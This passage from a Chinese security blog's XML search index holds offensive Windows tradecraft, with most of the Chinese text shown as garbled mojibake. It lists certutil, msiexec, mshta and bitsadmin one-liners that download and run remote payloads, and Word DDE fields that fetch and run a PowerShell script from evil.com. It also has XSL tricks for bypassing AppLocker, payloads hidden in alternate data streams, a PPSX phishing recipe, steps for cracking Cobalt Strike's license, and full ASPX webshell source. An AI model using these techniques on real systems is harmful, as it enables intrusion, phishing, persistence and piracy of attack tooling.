rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==") 8ã€certutileg:1certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete 9ã€msiexec1msiexec /q /i http://site.com/payloads/calc.png calc.png1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png 10ã€msxsl.exe(éœ€ä¸‹è½½)eg:1msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl demo.xml1234567&lt;?xml version="1.0"?&gt;&lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?&gt;&lt;customers&gt;&lt;customer&gt;&lt;name&gt;Microsoft&lt;/name&gt;&lt;/customer&gt;&lt;/customers&gt; exec.xsl1234567891011121314151617&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:schemas-microsoft-com:xslt"xmlns:user="http://mycompany.com/mynamespace"&gt; &lt;msxsl:script language="JScript" implements-prefix="user"&gt; function xml(nodelist) &#123;var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); return nodelist.nextNode().xml; &#125;&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="user:xml(.)"/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; 11ã€IEExeceg:12C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s offC:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe ç»†èŠ‚ï¼šæˆ³æˆ‘ 12ã€IEXPLORE.EXEè¿™ä¸ªéœ€è¦IEå­˜åœ¨å¯æ‰§è¡Œå‘½ä»¤çš„æ¼æ´eg:1"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://site.com/exp expå¯ä»¥ä½¿ç”¨ç±»ä¼¼ms14_064 13ã€å½“ä½¿ç”¨UNC/WebDAVæ—¶å€™å¤šçš„å‡ ç§å§¿åŠ¿Cmd1cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt Cscript/Wscript1cscript //E:jscript \\webdavserver\folder\payload.txt Regasm/Regsvc1C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll dll å¯ä»¥ä½¿ç”¨C#å†™çš„ Msbuild1cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml" pcalua.exe1pcalua.exe -a \\server\payload.dll æ–¹å¼åº”è¯¥è¿˜æœ‰å¾ˆå¤šï¼Œæ¬¢è¿ç•™è¨€è¡¥å……ï¼ï¼]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSWord Code Exec Without Macro]]></title>
    <url>%2Farchives%2FMSWord_Code_Exec_Without_Macro.html</url>
    <content type="text"><![CDATA[ä»Šå¤©å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„Wordæ‰§è¡Œä»£ç çš„æ–¹å¼ï¼Œä¹Ÿæ˜¯ä¸éœ€è¦å¯ç”¨å®çš„ï¼Œæ‰€ä»¥åˆ†äº«ç»™å¤§å®¶ä¸€æ³¢ã€‚æ“ä½œä¹ŸæŒºç®€å•çš„ã€‚é¦–å…ˆæ–°å»ºä¸€ä¸ªwordæ–‡æ¡£ï¼Œç„¶åæ’å…¥åŸŸï¼š é€‰æ‹© = (Formula) å³é”®ï¼Œåˆ‡æ¢åŸŸä»£ç  ä»£ç å¤„ä¿®æ”¹ä¸ºï¼š1&#123;DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" &#125; ä¹‹åï¼Œå³é”®æ›´æ–°åŸŸï¼Œå†æŠŠæ–‡æ¡£æ”¹æˆdocxæ ¼å¼å³å¯ã€‚æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š æ¯”è¾ƒé¸¡è‚‹çš„æ˜¯ç‚¹æ˜¯ä»¥åæ‰ä¼šæ‰§è¡Œã€‚ é™¤äº†ä½¿ç”¨DDEAUTOï¼Œä½¿ç”¨DDEä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå…·ä½“å¦‚ä¸‹ï¼š1&#123;DDE "c:\\windows\\system32\\cmd.exe" "/c notepad" &#125; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨DDEä¸ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œéœ€è¦å¯¹æ–‡æ¡£è¿›è¡Œä¿®æ”¹ï¼Œå°†æ–‡æ¡£é‡å‘½åä¸ºrarï¼Œæ‰“å¼€ä»¥åä¿®æ”¹ word/settings.xml,æ·»åŠ 1&lt;w:updateFields w:val="true"/&gt; ä½¿ç”¨DDEæ•ˆæœå¦‚ä¸‹ï¼š ä¸ªäººæ„Ÿè§‰ä½¿ç”¨DDEæ•ˆæœæ›´å¥½ç‚¹ã€‚ å¦‚ä½•è·å–äº¤äº’å¼shell ï¼Ÿ 1&#123; DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evil.com/evil.ps1');powershell -e $e "&#125;]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike3.8 ç ´è§£ç‰ˆ]]></title>
    <url>%2Farchives%2FCobaltStrike_3_8_Cracked-html.html</url>
    <content type="text"><![CDATA[ä¹‹å‰ä¸€ç›´æƒ³ä¸‹è½½3.8ï¼Œä½†æ˜¯æ²¡ä¸‹è½½åˆ°ï¼Œçœ‹åˆ°å°ä¼™ä¼´ç•™è¨€å‘äº†ä¸€ä¸ªè¯•ç”¨ç‰ˆçš„é“¾æ¥ï¼ˆå®‰å…¨æ€§æœªçŸ¥ï¼‰ã€‚é“¾æ¥ï¼šæˆ³æˆ‘ ç„¶åå°±ä¸‹è½½äº†ä¸€ä¸‹,å‘ç°è¿™ä¸ªå¹¶ä¸æ˜¯ç ´è§£ç‰ˆã€‚å¦‚ä¸‹å›¾: æ‰€ä»¥å°±å¯¹å…¶è¿›è¡Œäº†ç®€å•çš„ä¿®æ”¹ï¼Œå¹¶æŠŠæ–¹æ³•åˆ†äº«ç»™å¤§å®¶ï¼Œä»¥ä¾¿å¤§å®¶ä½¿ç”¨ã€‚é¦–å…ˆï¼Œå¯¹cobaltstrike.jarè¿›è¡Œè§£å‹ï¼Œè§£å‹ä»¥åæ‰¾åˆ°common\License.class,ä½¿ç”¨jadè¿›è¡Œåç¼–è¯‘ã€‚12C:\Users\evi1cg\Desktop\jad&gt;jad License.classParsing License.class... Generating License.jad ä¹‹åç¼–è¾‘License.jadæ–‡ä»¶ï¼Œä¿®æ”¹ä»¥ä¸‹å‚æ•°ã€‚æ‰¾åˆ°life,ä¿®æ”¹ä¸º65535L: ä¹‹åå°†License.jadé‡å‘½åä¸ºLicense.javaï¼Œç½®äºè§£å‹ä»¥åçš„CobaltStrikeçš„æ ¹ç›®å½•ï¼Œä¹‹åä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ã€‚1javac -classpath . License.java ç¼–è¯‘ä»¥åå¾—åˆ°License.classï¼Œä½¿ç”¨winraræ‰“å¼€æœªè§£å‹çš„CobaltStrikeï¼Œä½¿ç”¨ä¿®æ”¹åçš„License.classæ›¿æ¢åŸæ¥çš„License.classå³å¯ã€‚ å¦‚æœä¸æƒ³æ‰“å¼€çš„æ—¶å€™å¼¹æ¡†ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹License.javaè¿›è¡Œç¼–è¯‘12345678910111213141516171819202122232425262728293031323334353637383940414243444546package common;import aggressor.Prefs;public class License&#123; public License() &#123; &#125; private static long getTimeSinceStart() &#123; Prefs prefs = Prefs.getPreferences(); today = System.currentTimeMillis(); start = prefs.getLongNumber("cobaltstrike.start.int", 0L); if(start == 0L) &#123; prefs.set("cobaltstrike.start.int", (new StringBuilder()).append("").append(today).append("").toString()); prefs.save(); start = today; &#125; difference = (today - start) / 0x5265c00L; return difference; &#125; public static void checkLicenseGUI() &#123; getTimeSinceStart(); &#125; public static boolean isTrial() &#123; return true; &#125; public static void checkLicenseConsole() &#123; &#125; private static long life = 65535L; private static long today = 0L; private static long start = 0L; private static long difference = 0L;&#125; åœ¨è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå‚ç…§è¿™ä¸ªæ–‡ç« è¿›è¡Œç ´è§£æ˜¯æœ‰é—®é¢˜çš„ï¼Œä»–ç›´æ¥ä¿®æ”¹äº†common.License.isTrial()çš„è¿”å›å€¼ä¸ºflaseã€‚123456public static boolean isTrial() &#123; return true; // å¿…é¡»ä¿®æ”¹å‡½æ•° // return false; //edit here &#125; å¯¼è‡´åœ¨ArtifactUtilsç±»ä¸­å¤„ç†å‡½æ•°XorEncodeç›´æ¥èµ°å‘payloadçš„Encodeã€‚12345678910111213141516171819202122232425public static byte[] XorEncode(byte data[], String arch)&#123; if(License.isTrial()) &#123; CommonUtils.print_trial((new StringBuilder()).append("Disabled ").append(arch).append(" payload stage encoding.").toString()); return data; &#125; AssertUtils.Test(data.length &gt; 16384, "XorEncode used on a stager (or some other small thing)"); AssertUtils.TestArch(arch); if("x86".equals(arch)) &#123; byte decoder[] = CommonUtils.pickOption("resources/xor.bin"); byte payload[] = XorEncoder.encode(data); return CommonUtils.join(decoder, payload); &#125; if("x64".equals(arch)) &#123; byte decoder[] = CommonUtils.readResource("resources/xor64.bin"); byte payload[] = XorEncoder.encode(data); return CommonUtils.join(decoder, payload); &#125; else &#123; return new byte[0]; &#125;&#125; ä½†æ˜¯ç”±äºè¯•ç”¨ç‰ˆä¸å­˜åœ¨xor.binä»¥åŠxor64.bin,æ‰€ä»¥ä¼šå¯¼è‡´æ— æ³•åˆ›å»ºç›‘å¬ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯åªæ”¹æ—¶é—´å¥½äº†ã€‚ç„¶åæˆ‘ä»¬çš„cså°±å¯ä»¥ä½¿ç”¨äº†ï¼Œç¼ºç‚¹å°±æ˜¯ä¸èƒ½åŠ å¯†payloadã€‚ ä¿®æ”¹ç‰ˆä¸‹è½½é“¾æ¥: é“¾æ¥: æˆ³æˆ‘ å¯†ç : 86f3 å®‰å…¨æ€§è¯·è‡ªè¡ŒéªŒè¯ï¼ï¼]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€ä¸­çš„ADS]]></title>
    <url>%2Farchives%2FADS.html</url>
    <content type="text"><![CDATA[ä¸ºäº†æµ‹è¯•ï¼Œåœ¨è¿™é‡Œä½¿ç”¨Cobaltstrike ç”Ÿæˆä¸€ä¸ªexeï¼Œç”¨æ¥æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œå¹¶å¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼Œæ¯æ¬¡ä¸Šä¼ æ–‡ä»¶ä»¥åï¼ŒæœåŠ¡å™¨è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚ä¸‹å›¾ï¼š PS: meterpreterä¼šè¯æ˜¯é€šè¿‡powershell web_deliveryè·å–çš„ å°è¯•åˆ›å»ºæ–‡ä»¶å¤¹æˆåŠŸï¼š å°†æ–‡ä»¶ä¸Šä¼ è‡³ç‰¹æ®Šç›®å½•ï¼š1upload /tmp/beacon.exe \\\\.\\c:\\WINDOWS\\debug\\WIA\\123:aa.exe upload /tmp/beacon.exe 123:aa.exeä¹Ÿå¯ä»¥ï¼Œè¿™æ˜¯å†™åˆ°äº†å½“å‰ç›®å½•ã€‚ ä¸Šä¼ ä»¥åè¿›å…¥shell å¯ä½¿ç”¨ dir /ræ¥æŸ¥çœ‹ å¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥äº†ï¼Œä¹‹åä½¿ç”¨WMICæ¥æ‰§è¡Œï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š12wmic process call create \\.\c:\WINDOWS\debug\WIA\123:aa.exewmic process call create C:\WINDOWS\debug\WIA\123:aa.exe //å½“å‰ç›®å½•ä½¿ç”¨ï¼Œéœ€è¦ç»å¯¹è·¯å¾„ ä¹Ÿå¯ä»¥ä½¿ç”¨msfæ¥æ‰§è¡Œ1execute -cH -f "\\\\.\\c:\\WINDOWS\\debug\\WIA\\123:aa.exe" åˆ°cobalé‡Œé¢å¯ä»¥çœ‹åˆ°ä¼šè¯ã€‚ å¦‚æœæœ‰æƒé™çš„è¯ï¼Œå¯ä½¿ç”¨certutilä¸‹è½½æ–‡ä»¶åˆ°ADS1certutil -urlcache -split -f http://url/test.exe \\.\c:\WINDOWS\debug\WIA\123:aa.exe åˆ é™¤certutilç¼“å­˜1certutil.exe -urlcache -split -f http://url/test.exe delete æµ‹è¯•æ—¶å‘ç°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œä½¿ç”¨testï¼š ä½¿ç”¨nul æµ‹è¯•å‘ç°ï¼Œå¦‚æœæƒ³è¦dir /s é‡Œé¢çœ‹ä¸åˆ°ADSï¼Œå¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶ä¸ºï¼š12345\\.\C:\test\COM1\\.\C:\test\COM2...\\.\C:\test\COM9\\.\C:\test\nul å¹¶ä¸”è¿™äº›æ–‡ä»¶æ˜¯ä¸å¯ä»¥ç›´æ¥åˆ é™¤çš„ï¼Œè¦åˆ é™¤çš„è¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š1del \\.\C:\test\nul å†åˆ†äº«ä¸€ä¸‹æ€ä¹ˆæ ·å¸¦å‚æ•°æ‰§è¡ŒADSæ–‡ä»¶ï¼Œå…¶å®å¯ä»¥å€ŸåŠ©äºMSFï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹1execute -iH -f "c:\\æ–‡ä»¶è·¯å¾„\\123:1.exe" -a "æ–‡ä»¶å‚æ•°" æ•ˆæœå¦‚ä¸‹å›¾ï¼š ä½¿ç”¨msfåˆ é™¤ADSï¼Œå¯ç›´æ¥ä½¿ç”¨rm åŠ ç»å¯¹è·¯å¾„å³å¯ï¼Œå¦‚ä¸‹å›¾ï¼š]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>ads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Some Tricks]]></title>
    <url>%2Farchives%2FTricks.html</url>
    <content type="text"><![CDATA[è¿œç¨‹æ‰§è¡Œsctçš„å¦ä¸€ç§å§¿åŠ¿ 1cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct detailï¼šhttps://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd å‘½ä»¤è¡Œä¸‹è½½å§¿åŠ¿1123bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zipbitsadmin /rawreturn /transfer getpayload http://download.sysinternals.com/files/PSTools.zip c:\p.zipbitsadmin /transfer myDownLoadJob /download /priority normal "http://download.sysinternals.com/files/PSTools.zip" "c:\p.zip" å‘½ä»¤è¡Œä¸‹è½½å§¿åŠ¿21certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt æ¸…é™¤ç¼“å­˜ certutil -urlcache -split -f http://192.168.254.102:80/a.txt delete å‘½ä»¤è¡Œæ‰§è¡Œè¿œç¨‹JS1certutil -urlcache -split -f http://192.168.254.102:80/a a.js &amp;&amp; cscript a.js &amp;&amp; del a.js &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete å‘½ä»¤è¡Œè¿œç¨‹æ‰§è¡ŒVBS1certutil -urlcache -split -f http://192.168.254.102:80/abc a.vbs &amp;&amp; cscript a.vbs &amp;&amp; del a.vbs &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/abc delete å‘½ä»¤è¡Œè¿œç¨‹æ‰§è¡ŒHTA1mshta http://192.168.254.102/1.hta]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[powershell é€šè¿‡IEä¸‹è½½æ–‡ä»¶]]></title>
    <url>%2Farchives%2FDownloader_byIE.html</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122$ie = New-Object -Com internetExplorer.Application$ie.Navigate("https://site.com/somefile")#------------------------------#Wait for Download Dialog box to pop upSleep 5while($ie.Busy)&#123;Sleep 1&#125;#------------------------------#Hit "S" on the keyboard to hit the "Save" button on the download box$obj = new-object -com WScript.Shell$obj.AppActivate('Internet Explorer')$obj.SendKeys('s')#Hit "Enter" to save the file$obj.SendKeys('&#123;Enter&#125;')#Closes IE Downloads window$obj.SendKeys('&#123;TAB&#125;')$obj.SendKeys('&#123;TAB&#125;')$obj.SendKeys('&#123;TAB&#125;')$obj.SendKeys('&#123;Enter&#125;') åŸæ–‡ï¼šæˆ³æˆ‘]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bypass AppLocker With MSXSL.EXE]]></title>
    <url>%2Farchives%2FAppLocker_Bypass_MSXSL.html</url>
    <content type="text"><![CDATA[å…³äºXSLTä¹‹å‰å·²ç»æœ‰å‡ ç¯‡æ–‡ç« è¿›è¡Œä»‹ç»äº†ï¼ŒHack With XSLTï¼ŒXXE with XSLï¼ŒXsl Exec Webshell ï¼Œä»Šå¤©åˆ†äº«ä¸€ä¸ªé€šè¿‡MSXSL.exeç»•è¿‡Applockerçš„æ–¹æ³•ã€‚msxsl.exeæ˜¯å¾®è½¯ç”¨äºå‘½ä»¤è¡Œä¸‹å¤„ç†XSLçš„ä¸€ä¸ªç¨‹åºï¼Œæ‰€ä»¥é€šè¿‡ä»–ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒJavaScriptè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸‹è½½åœ°å€ä¸ºï¼šæˆ³æˆ‘ msxsl.exe éœ€è¦æ¥å—ä¸¤ä¸ªæ–‡ä»¶ï¼ŒXMLåŠXSLæ–‡ä»¶ï¼Œå‘½ä»¤è¡Œæ“ä½œå¦‚ä¸‹ï¼š1msxsl.exe demo.xml exec.xsl demo.xml1234567&lt;?xml version="1.0"?&gt;&lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?&gt;&lt;customers&gt;&lt;customer&gt;&lt;name&gt;Microsoft&lt;/name&gt;&lt;/customer&gt;&lt;/customers&gt; exec.xsl1234567891011121314151617&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:schemas-microsoft-com:xslt"xmlns:user="http://mycompany.com/mynamespace"&gt; &lt;msxsl:script language="JScript" implements-prefix="user"&gt; function xml(nodelist) &#123;var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); return nodelist.nextNode().xml; &#125;&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="user:xml(.)"/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; åŒæ ·çš„ï¼Œmsxsl.exeå¯ä»¥è¿œç¨‹åŠ è½½ï¼Œå…·ä½“æ–¹å¼å¦‚ä¸‹ï¼š1msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[æ„é€ PPSXé’“é±¼æ–‡ä»¶]]></title>
    <url>%2Farchives%2FCreate_PPSX.html</url>
    <content type="text"><![CDATA[ä¹‹å‰å‡ºç°äº†ä¸€ç§æ–°å‹çš„é’“é±¼æ”»å‡»çš„æ‰‹æ³•ï¼Œå³é€šè¿‡PPTåœ¨æœªå¼€å¯å®çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œç¨‹åºï¼Œå…³äºè¿™ä¸ªFreebufä¹Ÿæœ‰ç›¸å…³æ–‡ç« è¿›è¡Œä»‹ç»ï¼Œã€Šæ–°å‹PPTé’“é±¼æ”»å‡»åˆ†æã€‹ï¼Œã€Šæ— éœ€å®ï¼ŒPPTä¹Ÿèƒ½ç”¨æ¥æŠ•é€’æ¶æ„ç¨‹åºã€‹ã€‚ä½†æ˜¯æ–‡ä¸­éƒ½æœªä»‹ç»æ€ä¹ˆåˆ¶ä½œè¿™ç§æ–‡ä»¶ï¼Œæ‰€ä»¥ï¼Œä»Šå¤©åœ¨è¿™é‡Œåˆ†äº«ä¸€ä¸‹åˆ¶ä½œè¯¥æ–‡ä»¶çš„æ–¹æ³•ï¼Œå¸Œæœ›å¤§å®¶äº†è§£å¹¶å¯¹æ­¤è¿›è¡Œé˜²å¾¡ã€‚ é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ™®é€šçš„PPTXæ–‡ä»¶ï¼Œéšä¾¿å¡«å…¥ä¸€äº›å†…å®¹ï¼Œå¦‚ä¸‹å›¾ï¼š ä¹‹åæ’å…¥ä¸€ä¸ªåŠ¨ä½œæŒ‰é’®ï¼Œå…·ä½“ä½ç½®å¦‚ä¸‹å›¾ï¼š è¿™é‡Œè¦é€‰æ‹©ç©ºç™½çš„é‚£ä¸ªï¼Œé€‰æ‹©ä»¥åï¼Œåœ¨é¡µé¢ä¸­æ‹‰å‡ºä¸€ä¸ªè§¦å‘ä½ç½®ï¼Œä¹‹åä¼šå¼¹å‡ºåŠ¨ä½œè®¾ç½®çš„ç•Œé¢ï¼š é€‰æ‹©é¼ æ ‡ç§»è¿‡-&gt;è¿è¡Œç¨‹åºï¼š é€‰æ‹©è¦è¿è¡Œçš„ç¨‹åºå¯åœ¨åé¢ç›´æ¥åŠ å‚æ•°ï¼Œå¦‚è®¡ç®—å™¨ï¼Œä¹‹åç‚¹å‡»ç¡®å®šã€‚ç°åœ¨æ˜¾ç¤ºä¸ºä¸€ä¸ªæœ‰è‰²åŒºåŸŸï¼Œæ‰€ä»¥è¦å¯¹ä»–è¿›è¡Œè®¾ç½®ï¼Œå³é”®-&gt;è®¾ç½®å½¢çŠ¶æ ¼å¼ï¼Œå°†å¡«å……å’Œçº¿æ¡é¢œè‰²æ”¹æˆæ—  æœ€åå°†æ–‡ä»¶ä¿å­˜ä¸ºPPSXæ–‡ä»¶å³å¯ã€‚ æœ€ç»ˆæ•ˆæœï¼š]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xsl Exec Webshell (aspx)]]></title>
    <url>%2Farchives%2FXsl_Exec_Webshell.html</url>
    <content type="text"><![CDATA[å…³äºä½¿ç”¨xslçš„webshellä»¥å‰å·²ç»æœ‰äººå‘è¿‡äº†ï¼Œæ¯”å¦‚aspxçš„ä¸€ä¸ªwebshellå¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728&lt;%@ Page Language="C#" Debug="true" %&gt;&lt;%@ import Namespace="System.IO"%&gt;&lt;%@ import Namespace="System.Xml"%&gt;&lt;%@ import Namespace="System.Xml.Xsl"%&gt;&lt;%string xml=@"&lt;?xml version=""1.0""?&gt;&lt;root&gt;test&lt;/root&gt;";string xslt=@"&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh""&gt; &lt;msxsl:script language=""JScript"" implements-prefix=""zcg""&gt; &lt;msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;![CDATA[function xml() &#123;var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Request.Item['a'],'unsafe');Response.End();&#125;]]&gt; &lt;/msxsl:script&gt;&lt;xsl:template match=""/root""&gt; &lt;xsl:value-of select=""zcg:xml()""/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;";XmlDocument xmldoc=new XmlDocument();xmldoc.LoadXml(xml);XmlDocument xsldoc=new XmlDocument();xsldoc.LoadXml(xslt);XslCompiledTransform xct=new XslCompiledTransform();xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());xct.Transform(xmldoc,null,new MemoryStream());%&gt; å¯†ç ä¸º aï¼Œè¿™ä¸ªwebshellæ˜¯å¯ä»¥ç”¨èœåˆ€è¿æ¥çš„ï¼Œæµ‹è¯•ç¢°åˆ°è¿™ç§æƒ…å†µï¼šæœåŠ¡å™¨æœ‰å®‰å…¨ç‹—ç­‰é˜²æŠ¤è½¯ä»¶ï¼Œæäº¤çš„å„ç§æ•°æ®åŒ…å¯èƒ½ä¼šæ‹¦æˆªï¼Œè€Œç°åœ¨æƒ³è¦åšçš„å°±æ˜¯æ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå†™äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„webshellï¼Œå¯å›æ˜¾ï¼Œå¯æ”¹å¯†ç ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;%@page language="C#"%&gt;&lt;%@ import Namespace="System.IO"%&gt;&lt;%@ import Namespace="System.Xml"%&gt;&lt;%@ import Namespace="System.Xml.Xsl"%&gt;&lt;%string xml=@"&lt;?xml version=""1.0""?&gt;&lt;root&gt;test&lt;/root&gt;";string xslt=@"&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh""&gt; &lt;msxsl:script language=""JScript"" implements-prefix=""zcg""&gt; &lt;msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;![CDATA[function xml()&#123; var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response; var command = Request.Item['cmd']; var r = new ActiveXObject(""WScript.Shell"").Exec(""cmd /c ""+command); var OutStream = r.StdOut; var Str = """"; while (!OutStream.atEndOfStream) &#123; Str = Str + OutStream.readAll(); &#125; Response.Write(""&lt;pre&gt;""+Str+""&lt;/pre&gt;""); &#125;]]&gt; &lt;/msxsl:script&gt;&lt;xsl:template match=""/root""&gt; &lt;xsl:value-of select=""zcg:xml()""/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;";XmlDocument xmldoc=new XmlDocument();xmldoc.LoadXml(xml);XmlDocument xsldoc=new XmlDocument();xsldoc.LoadXml(xslt);XsltSettings xslt_settings = new XsltSettings(false, true);xslt_settings.EnableScript = true;try&#123; XslCompiledTransform xct=new XslCompiledTransform(); xct.Load(xsldoc,xslt_settings,new XmlUrlResolver()); xct.Transform(xmldoc,null,new MemoryStream());&#125;catch (Exception e)&#123; Response.Write("Error");&#125;%&gt; å¯†ç ä¸ºcmdï¼Œå¯è‡ªå·±æ”¹ï¼Œæµ‹è¯•å¦‚ä¸‹å›¾ï¼š é™„å¸¦ä¸€ä¸ªå¤§é©¬é‡Œé¢çš„å‘½ä»¤æ‰§è¡Œï¼š12345678910111213141516171819202122232425262728293031323334353637&lt;%@ Page Language="VB" Debug="true" %&gt;&lt;%@ import Namespace="system.IO" %&gt;&lt;%@ import Namespace="System.Diagnostics" %&gt;&lt;script runat="server"&gt; Sub RunCmd(Src As Object, E As EventArgs) Dim myProcess As New Process() Dim myProcessStartInfo As New ProcessStartInfo(xpath.text) myProcessStartInfo.UseShellExecute = false myProcessStartInfo.RedirectStandardOutput = true myProcess.StartInfo = myProcessStartInfo myProcessStartInfo.Arguments=xcmd.text myProcess.Start() Dim myStreamReader As StreamReader = myProcess.StandardOutput Dim myString As String = myStreamReader.Readtoend() myProcess.Close() mystring=replace(mystring,"&lt;","&amp;lt;") mystring=replace(mystring,"&gt;","&amp;gt;") result.text= vbcrlf &amp; "&lt;pre&gt;" &amp; mystring &amp; "&lt;/pre&gt;" End 